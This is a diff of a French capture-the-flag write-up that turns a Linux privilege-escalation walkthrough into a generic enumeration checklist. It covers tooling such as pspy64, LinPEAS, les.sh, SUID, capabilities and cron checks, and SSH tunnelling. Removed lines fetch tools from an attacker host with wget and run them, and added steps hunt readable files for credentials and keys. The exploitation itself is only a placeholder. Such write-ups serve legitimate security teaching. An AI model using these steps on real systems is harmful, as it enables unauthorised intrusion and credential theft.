@@ -230,50 +230,84 @@ Si aucun vhost distinct n’est identifié, ce fichier confirme l’absence de r
 
 {{< escalade-intro user="ssh_user" >}}
 
-### Observation avec pspy64
+Comme expliqué dans la recette {{< recette "privilege-escalation-linux" >}}, l’escalade de privilèges Linux suit une méthode structurée : observer d’abord les tâches automatiques, puis vérifier les pistes classiques une par une avant de passer aux outils plus complets.
 
-Une autre vérification classique consiste à surveiller les processus exécutés sur la machine afin d’identifier d’éventuelles tâches automatiques lancées par `root`.
+L’objectif est de comprendre le système avant de tenter une exploitation.
 
-Pour cela, tu ouvres une deuxième session SSH et tu utilises l’outil `pspy64`.
+### Préparation des outils d’énumération
 
-Comme expliqué dans la recette {{< recette "privilege-escalation-linux" >}}, l’objectif est de lancer d’abord l’observation des tâches root puis de continuer l’énumération dans une autre session.
+Depuis la machine Kali, tu prépares les outils utiles pour l’énumération locale :
 
-Tu télécharges ensuite l’outil dans un répertoire accessible en écriture :
+* `pspy64`
+* `suid3num.py`
+* `linpeas.sh`
+* `les.sh`
+
+Avec l’aide de la recette {{< recette "copier-fichiers-kali" >}}, tu peux les transférer vers un répertoire accessible en écriture sur la cible, par exemple `/dev/shm` ou `/tmp`.
+
+Sur la cible :
 
 ```bash
 cd /dev/shm
-wget http://10.10.x.x:8000/pspy64
 chmod +x pspy64
+chmod +x linpeas.sh
+chmod +x les.sh
+```
+
+Le répertoire `/dev/shm` est pratique en CTF, car il est généralement accessible en écriture et stocké en mémoire volatile.
+
+### Observation passive avec pspy64
+
+Avant de lancer les vérifications manuelles, tu ouvres une deuxième session SSH et tu démarres `pspy64`.
+
+```bash
+cd /dev/shm
 ./pspy64
 ```
 
-L’objectif est notamment de détecter :
+Cette observation permet de surveiller les processus exécutés automatiquement sur la machine, notamment ceux lancés par `root`.
 
-- des scripts exécutés automatiquement par `root`
-- des tâches cron personnalisées
-- des commandes exécutées périodiquement
-- des accès à des fichiers sensibles
-- des binaires exécutés avec des chemins relatifs
+Les éléments intéressants à surveiller sont :
 
-Tu laisses ensuite `pspy64` tourner en arrière-plan pendant la suite de l’énumération afin d’observer d’éventuelles tâches exécutées automatiquement par `root`.
+* les commandes exécutées avec `UID=0`
+* les scripts lancés automatiquement
+* les tâches cron personnalisées
+* les fichiers ou chemins utilisés par des processus root
+* les binaires appelés avec des chemins relatifs
 
-### Sudo -l
+Tu laisses ensuite `pspy64` tourner pendant le reste de l’énumération manuelle.
 
-Comme souvent lors d’une phase d’escalade de privilèges Linux, tu commences par vérifier les permissions sudo de l’utilisateur courant :
+### Vérification sudo
 
+Tu vérifies ensuite les permissions sudo de l’utilisateur courant :
+
+```bash
+sudo -l
 ```
-ssh_user@planning:~$ sudo -l
-[sudo] password for ssh_user: 
-Sorry, user ssh_user may not run sudo on planning.
+
+Exemple de résultat sans droit sudo exploitable :
+
+```text
+ssh_user@machine:~$ sudo -l
+[sudo] password for ssh_user:
+Sorry, user ssh_user may not run sudo on machine.
 ```
 
-L’utilisateur `ssh_user` ne possède donc aucun droit sudo exploitable.
+À ce stade, il faut rechercher en priorité :
+
+* les droits `NOPASSWD`
+* les commandes exécutables en root
+* les scripts personnalisés
+* les variables d’environnement conservées
+* les binaires exploitables via GTFOBins
+
+Si une commande exploitable apparaît ici, cette piste devient prioritaire.
 
 ### Exploration du contexte utilisateur
 
-Avant d’aller plus loin, tu vérifies le contexte dans lequel tu te trouves :
+Tu identifies ensuite précisément le contexte dans lequel tu te trouves :
 
-```
+```bash
 whoami
 id
 pwd
@@ -281,137 +315,329 @@ uname -a
 hostname
 ```
 
-Résultat :
+Cette étape permet de confirmer :
 
-```
+* l’utilisateur courant
+* les groupes associés
+* le répertoire de travail
+* la version du noyau Linux
+* l’architecture de la machine
+* le nom de l’hôte
+* d’éventuels indices de containerisation
+
+Exemple :
+
+```text
 ssh_user
 uid=1000(ssh_user) gid=1000(ssh_user) groups=1000(ssh_user)
 /home/ssh_user
-Linux planning 6.8.0-59-generic #61-Ubuntu SMP PREEMPT_DYNAMIC Fri Apr 11 23:16:11 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
-planning
+Linux machine 6.8.0-59-generic #61-Ubuntu SMP PREEMPT_DYNAMIC x86_64 GNU/Linux
+machine
 ```
 
-Cette étape permet notamment de confirmer :
+### Recherche de fichiers lisibles intéressants
 
-- l’utilisateur courant
-- les groupes associés
-- le noyau Linux utilisé
-- le nom de la machine
-- le répertoire de travail actuel
+Avant de poursuivre, tu recherches les fichiers accessibles à l’utilisateur courant dans les emplacements classiques comme `/home` et `/opt`.
+
+Ces répertoires contiennent souvent des scripts internes, des sauvegardes, des fichiers de configuration ou des outils personnalisés.
+
+```bash
+find /home /opt -type f -readable 2>/dev/null
+```
+
+Les fichiers intéressants peuvent ensuite être inspectés manuellement, en particulier s’ils contiennent :
+
+* des identifiants
+* des chemins internes
+* des scripts exécutés automatiquement
+* des fichiers de configuration
+* des sauvegardes
+* des clés privées
+
+### Analyse des Linux capabilities
+
+Tu vérifies ensuite si certains binaires disposent de capabilities Linux.
+
+```bash
+getcap -r / 2>/dev/null
+```
+
+Les capabilities permettent à un programme d’effectuer certaines actions privilégiées sans être exécuté directement en root.
+
+Les éléments les plus intéressants sont notamment :
+
+* `cap_setuid`
+* `cap_setgid`
+* `cap_sys_admin`
+* toute capability appliquée à un binaire inhabituel
+
+Exemple de résultat classique :
+
+```text
+/usr/bin/ping cap_net_raw=ep
+```
+
+Un résultat standard comme `ping` n’est généralement pas exploitable. En revanche, une capability dangereuse sur un binaire inattendu doit être analysée attentivement.
 
 ### Recherche de binaires SUID
 
-Tu poursuis l’énumération en recherchant les **binaires SUID**, qui permettent parfois d’exécuter certaines commandes avec les privilèges de leur propriétaire.
+Tu recherches ensuite les binaires SUID présents sur le système :
 
-```
+```bash
 find / -perm -4000 -type f 2>/dev/null
 ```
 
-La liste obtenue ne contient que des binaires système classiques tels que :
+Les binaires SUID peuvent parfois permettre d’exécuter certaines commandes avec les privilèges de leur propriétaire.
 
-```
+Tu recherches en priorité :
+
+* les binaires inhabituels
+* les binaires personnalisés
+* les scripts ou programmes appartenant à root
+* les binaires présents dans GTFOBins
+* les cas possibles de PATH hijacking
+
+Exemple de résultats classiques :
+
+```text
 /usr/bin/passwd
 /usr/bin/chsh
 /usr/bin/chfn
 /usr/bin/sudo
 /usr/bin/newgrp
-...
-```
-
-Ces résultats ne révèlent aucun binaire SUID inhabituel ni piste exploitable immédiate.
-
-### Analyse des Linux capabilities
-
-Tu vérifies ensuite si certains binaires disposent de **capabilities Linux**, qui permettent à un programme d’effectuer certaines actions privilégiées sans être exécuté en root ou via un binaire SUID.
-
-La vérification se fait avec la commande suivante :
-
-```
-getcap -r / 2>/dev/null
-```
-
-Résultat :
-
-```
-/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper cap_net_bind_service,cap_net_admin,cap_sys_nice=ep
-/usr/bin/ping cap_net_raw=ep
-/usr/bin/mtr-packet cap_net_raw=ep
-```
-
-Ces résultats ne révèlent aucune capability inhabituelle ni piste exploitable immédiate.
-
-### Analyse complémentaire avec suid3num.py
-
-Pour compléter l’analyse des binaires SUID, tu utilises l’outil `suid3num.py`, qui permet d’identifier rapidement :
-
-- les binaires SUID intéressants
-- leur présence éventuelle dans GTFOBins
-
-Tu le télécharges et l’exécutes depuis un répertoire en mémoire (`/dev/shm`) :
-
-```
-cd /dev/shm
-wget http://10.10.x.x:8000/suid3num.py
-python3 suid3num.py
-```
-
-L’analyse confirme principalement la présence de binaires système classiques :
-
-```
-/usr/bin/passwd
-/usr/bin/sudo
 /usr/bin/su
 /usr/bin/mount
 /usr/bin/umount
-...
 ```
 
-L’outil confirme que :
+Des binaires système standards ne constituent pas forcément une piste exploitable. En revanche, tout binaire personnalisé ou inattendu mérite une analyse plus poussée.
 
-- tous les binaires SUID présents sont standards
-- aucun binaire personnalisé n’est identifié
-- aucun binaire exploitable via GTFOBins n’est détecté
+### Analyse complémentaire avec suid3num.py
 
-Cette vérification confirme que la piste des SUID ne mène à rien dans ce cas précis.
+Pour compléter l’analyse des SUID, tu peux utiliser `suid3num.py`.
 
-### Inspection des tâches cron
-
-Tu vérifies ensuite les **tâches planifiées (cron)**, car certains scripts exécutés automatiquement par le système peuvent être modifiables par un utilisateur et permettre une élévation de privilèges.
-
-Les crons système peuvent être consultés avec :
-
+```bash
+cd /dev/shm
+python3 suid3num.py
 ```
+
+Cet outil aide à repérer rapidement les binaires SUID intéressants et à vérifier leur présence éventuelle dans GTFOBins.
+
+Après l’exécution de `getcap` ou de `suid3num.py`, chaque binaire suspect doit être vérifié manuellement.
+
+{{< note >}}
+GTFOBins est utile pour identifier des techniques connues d’exploitation de binaires Linux, mais il ne remplace pas l’analyse du contexte local. Un binaire présent dans GTFOBins n’est exploitable que si les permissions et les conditions d’exécution s’y prêtent.
+{{< /note >}}
+
+### Inspection des tâches cron et timers systemd
+
+Tu vérifies ensuite les tâches planifiées classiques :
+
+```bash
 cat /etc/crontab
+ls -la /etc/cron*
 ```
 
-Résultat :
+Tu peux également consulter les timers systemd :
 
+```bash
+systemctl list-timers
 ```
+
+Les éléments intéressants sont :
+
+* les scripts exécutés par `root`
+* les chemins modifiables par l’utilisateur courant
+* les scripts appelés depuis `/opt`, `/home` ou `/tmp`
+* les tâches personnalisées
+* les scripts exécutés de manière répétée
+
+Exemple de cron système standard :
+
+```text
 17 * * * * root cd / && run-parts --report /etc/cron.hourly
 25 6 * * * root test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
 47 6 * * 7 root test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
 52 6 1 * * root test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
 ```
 
-Aucune tâche personnalisée ni script modifiable par l’utilisateur `ssh_user` n’apparaît ici.
+Si aucune tâche personnalisée n’apparaît, cette piste ne donne pas d’exploitation immédiate.
 
 ### Analyse des services locaux
 
-Tu vérifies ensuite les ports en écoute sur la machine afin d’identifier d’éventuels services accessibles uniquement depuis localhost.
+Tu vérifies ensuite les ports en écoute sur la machine.
 
+```bash
+ss -tulnp
 ```
-netstat -tulpn
+
+Alternative :
+
+```bash
+netstat -tulnp
 ```
 
-Résultat :
+L’objectif est d’identifier d’éventuels services accessibles uniquement en local, par exemple sur `127.0.0.1`.
 
-### Conclusion de l’énumération manuelle
+Les ports souvent intéressants en CTF sont :
 
-### Analyse avec linpeas.sh
-Dans **LinPEAS**, les vulnérabilités potentielles sont classées et surlignées par couleur.
+```text
+3000
+5000
+8000
+8080
+9000
+```
+
+Ces ports peuvent héberger :
+
+* une interface d’administration
+* une API interne
+* un dashboard
+* un service en mode debug
+* une application locale non exposée directement
+
+Si un service écoute uniquement sur `127.0.0.1`, tu peux y accéder depuis Kali avec un tunnel SSH.
+
+Exemple pour un service local sur le port `8080` :
+
+```bash
+ssh -L 8080:127.0.0.1:8080 ssh_user@machine.htb
+```
+
+Ensuite, depuis Kali :
+
+```text
+http://localhost:8080
+```
+
+Pour identifier quel service utilise un port donné, tu peux rechercher ce port dans les fichiers de configuration :
+
+```bash
+grep -r ':8080' /etc 2>/dev/null
+grep -r '8080' /etc 2>/dev/null
+```
+
+Cette recherche peut révéler :
+
+* un fichier de configuration
+* un service systemd
+* un chemin d’application
+* un utilisateur d’exécution
+* des identifiants ou paramètres sensibles
+
+### Analyse avec LinPEAS
+
+Si l’énumération manuelle ne révèle aucune piste exploitable, tu passes à une analyse plus complète avec LinPEAS.
+
+```bash
+cd /dev/shm
+./linpeas.sh
+```
+
+LinPEAS réalise une énumération locale approfondie et met en évidence les anomalies potentielles.
+
+Dans LinPEAS, les vulnérabilités potentielles sont classées et surlignées par couleur.
+
 ![Légende des couleurs de LinPEAS indiquant le niveau de criticité des vulnérabilités](/images/linpeas-legend.png)
 
----
+Tu l’utilises comme un outil de corrélation, pas comme une solution automatique.
+
+Les éléments à analyser en priorité sont :
+
+* les sections rouges et jaunes
+* les fichiers modifiables
+* les fichiers appartenant à root mais lisibles
+* les scripts exécutés automatiquement
+* les services locaux
+* les permissions sudo
+* les SUID inhabituels
+* les capabilities dangereuses
+* les variables d’environnement sensibles
+* les indices de containerisation
+
+Si LinPEAS confirme une piste déjà observée manuellement, cette piste mérite d’être approfondie.
+
+### Dernier recours : analyse du kernel
+
+Si aucune piste logique ne ressort, tu peux examiner la version du noyau.
+
+```bash
+uname -a
+```
+
+Tu peux ensuite utiliser `les.sh` pour identifier d’éventuelles vulnérabilités kernel connues.
+
+```bash
+cd /dev/shm
+./les.sh
+```
+
+L’exploitation kernel doit rester un dernier recours.
+
+Avant toute tentative, tu dois vérifier :
+
+* la version exacte du noyau
+* l’architecture
+* la compatibilité de l’exploit
+* les risques de crash
+* le mécanisme d’élévation de privilèges
+
+Dans la majorité des machines HTB Easy, l’escalade repose plutôt sur une mauvaise configuration que sur une vulnérabilité kernel.
+
+### Conclusion de l’énumération privilege escalation
+
+À la fin de cette phase, tu peux résumer les pistes testées :
+
+* sudo
+* contexte utilisateur
+* fichiers lisibles
+* capabilities
+* SUID
+* cron et timers
+* services locaux
+* LinPEAS
+* kernel
+
+Dans ce cas précis, la piste exploitable est :
+
+```text
+<résumer ici la piste réellement exploitée>
+```
+
+### Exploitation de la piste identifiée
+
+Tu exploites ensuite la mauvaise configuration identifiée pendant l’énumération.
+
+```bash
+<commandes d’exploitation>
+```
+
+Tu confirmes l’élévation de privilèges :
+
+```bash
+whoami
+id
+hostname
+```
+
+Résultat attendu :
+
+```text
+root
+uid=0(root) gid=0(root) groups=0(root)
+machine
+```
+
+### root.txt
+
+Une fois root, tu peux lire le flag final :
+
+```bash
+cat /root/root.txt
+```
+
+Cette étape termine l’escalade de privilèges.
 
 ## Conclusion
 
